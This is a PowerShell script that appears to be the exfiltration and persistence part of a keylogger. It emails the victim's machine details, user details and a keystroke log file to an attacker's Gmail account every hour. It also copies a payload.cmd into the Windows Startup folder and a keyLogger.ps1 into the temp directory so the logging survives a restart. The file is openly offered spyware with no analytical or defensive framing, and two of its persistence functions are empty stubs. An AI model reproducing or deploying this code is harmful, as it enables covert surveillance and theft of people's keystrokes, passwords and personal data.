[CmdletBinding()]
Param (
	[Parameter(Mandatory = $false)]
	[ValidateSet($True, "Startup", "TaskScheduler", "Registry", "All")]
	[string]$Type = "Startup"
)


$Email = "username@gmail.com"
$Password = "password"

$validPersistanceTypes = "Startup", "TaskScheduler", "Registry", "All"


function sendMail($logFile="$env:temp\$env:username.log") {
	
    $Subject = "You got mail from $env:USERNAME!"
    $Body = @"
                This email has been sent from $env:COMPUTERNAME
                -----------------------------------------------------------------
                Computer Name: $env:computername
                User Name: $env:username
                Home Directory: $env:userprofile
                Operating System: $env:OS
                Processor: $env:PROCESSOR_ARCHITECTURE $env:PROCESSOR_IDENTIFIER

"@
    if (Test-Path $logFile) {
        $Body += Get-Content -Path $logFile -Raw
    }
    $SMTPServer = "smtp.gmail.com"
    $SMTPClient = New-Object Net.Mail.SMTPClient($SMTPServer, 587)
    $SMTPClient.EnableSSL = $true
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Email, $Password)
    $SMTPClient.Send($Email, $Email, $Subject, $Body)
}

function scheduleMail($MinutesInterval=60) {
        $now = Get-Date
        $SecondsInterval = $MinutesInterval * 60
        $nextInterval = $now.AddMinutes($MinutesInterval - ($now.Minute % $MinutesInterval))
		$timeLeft = ($nextInterval - $now).TotalSeconds
	
        Start-Sleep -Seconds $timeLeft
        while ($true) {
            sendMail
            Start-Sleep -Seconds $SecondsInterval
        }
}

function persistStartup() {
	
	$trigger = "payload.cmd"
	$triggerPath = "$PWD\$trigger"
	$triggerDestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$trigger"	
	Copy-Item -Path $triggerPath -Destination $triggerDestinationPath -Force

	$script = "keyLogger.ps1"
	$scriptPath = "$PWD\$script"
	$scriptDestinationPath = "$env:TEMP\$script"	
	Copy-Item -Path $scriptPath -Destination $scriptDestinationPath -Force
}

function persistTaskScheduler() {
	
}

function persistRegistry() {
}

function persistAll() {
	persistStartup
	persistTaskScheduler
	persistRegistry
}


function CreatePersistance($Type) {
	
	
	switch ($Type) {
			
		"Startup" {
			# Place your specific logic for Startup here
			persistStartup
		}
		"TaskScheduler" {
			# Place your specific logic for TaskScheduler here
			persistTaskScheduler
		}
		"Registry" {
			# Place your specific logic for Registry here
			persistRegistry
		}
		"All" {
			# Place your specific logic for Registry here
			persistAll
		}
		default {
			Write-Output "Unknown option selected."
		}
	}
	
	
}


sendMail
CreatePersistance -Type $Type
scheduleMail -MinutesInterval 60